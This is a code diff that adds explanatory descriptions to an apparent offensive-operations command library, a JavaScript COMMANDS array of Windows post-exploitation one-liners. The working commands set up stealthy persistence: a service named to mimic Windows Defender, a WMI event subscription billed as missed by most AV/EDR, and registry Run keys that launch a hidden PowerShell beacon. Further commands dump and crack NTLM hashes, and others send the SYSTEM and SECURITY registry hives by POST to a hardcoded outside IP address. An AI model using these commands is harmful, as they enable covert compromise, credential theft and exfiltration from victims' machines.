@@ -2655,48 +2655,56 @@ const COMMANDS = [
   },
   {
     title: "[PERSIST-2] Create Malicious Service (Stealthier)",
+    desc: "Creates Windows service that runs on boot. Replace BASE64_BEACON with encoded payload. Requires Admin/SYSTEM. Check: 'sc query WindowsDefenderUpdate'.",
     code: "New-Service -Name 'WindowsDefenderUpdate' -BinaryPathName 'powershell -w hidden -ep bypass -enc BASE64_BEACON' -StartupType Automatic; Start-Service 'WindowsDefenderUpdate'",
     tags: ["ps", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[PERSIST-3] WMI Event Subscription (Hardest to Detect)",
+    desc: "STEALTHIEST. Fires every 60 seconds when perf data changes. Survives reboots. Most AV/EDR misses it. Replace BASE64_BEACON with encoded payload.",
     code: "$cmd = 'powershell -w hidden -ep bypass -enc BASE64_BEACON'\\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';EventNameSpace='root\\\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\\n$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';CommandLineTemplate=$cmd}\\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\\\subscription' -Arguments @{Filter=$Filter;Consumer=$Consumer}",
     tags: ["ps", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[PERSIST] Check Existing Scheduled Tasks",
+    desc: "Lists all scheduled tasks and what they run. Look for suspicious tasks or verify your persistence is installed.",
     code: "schtasks /query /fo LIST /v | findstr /i \"Task To Run:\\|Run As User:\"",
     tags: ["cmd", "persist", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "[PERSIST] Delete Scheduled Task",
+    desc: "Removes scheduled task by name. Use to clean up or remove your persistence before exfil.",
     code: "schtasks /delete /tn \"WindowsUpdate\" /f",
     tags: ["cmd", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[PERSIST] List WMI Subscriptions",
+    desc: "Check for existing WMI persistence. Shows all filters and consumers. Look for names like 'WinUpdate' or suspicious commands.",
     code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer",
     tags: ["ps", "persist", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "[PERSIST] Remove WMI Persistence",
+    desc: "Removes WMI persistence named 'WinUpdate'. Stops beacon spam from flooding C2. Change name if you used different one.",
     code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class __FilterToConsumerBinding | Remove-WmiObject",
     tags: ["ps", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[PERSIST] Registry Run Key (User-Level)",
+    desc: "Runs payload when THIS USER logs in. HKCU = current user only. Less reliable - only fires on login, not boot.",
     code: "reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
     tags: ["cmd", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "[PERSIST] Registry Run Key (SYSTEM-Level)",
+    desc: "Runs payload when ANY USER logs in. HKLM = all users. Requires Admin/SYSTEM to set. More reliable than HKCU.",
     code: "reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
     tags: ["cmd", "persist"],
     accent: "#e74c3c"
@@ -2706,36 +2714,42 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "VPS: Install Impacket",
+    desc: "Installs impacket toolkit (secretsdump, psexec, wmiexec, etc). Use 'apt install python3-impacket' if pip fails.",
     code: "pip3 install impacket",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Dump Hashes from SAM+SYSTEM",
+    desc: "Extracts NTLM hashes from SAM/SYSTEM registry hives. Outputs format: username:RID:LMHASH:NTHASH. Use NTHASH for PTH.",
     code: "impacket-secretsdump -sam sam.txt -system system.txt LOCAL",
     tags: ["linux", "vps", "postexploit", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Crack NTLM with Hashcat",
+    desc: "GPU-accelerated hash cracking. -m 1000 = NTLM mode. rockyou.txt = common password list. Add --force if no GPU.",
     code: "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Crack NTLM with John",
+    desc: "CPU-based cracking. Slower than hashcat but works without GPU. Good for VPS without graphics card.",
     code: "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "[EXFIL] Send SYSTEM Hive to VPS",
+    desc: "POSTs SYSTEM registry hive to VPS. REQUIRED with SAM - contains BOOTKEY to decrypt SAM hashes.",
     code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "[EXFIL] Send SECURITY Hive to VPS",
+    desc: "POSTs SECURITY hive. Contains LSA secrets (cached domain creds, service account passwords). Optional but valuable.",
     code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sec'); IRM -Uri 'http://168.144.166.97:8083/security' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
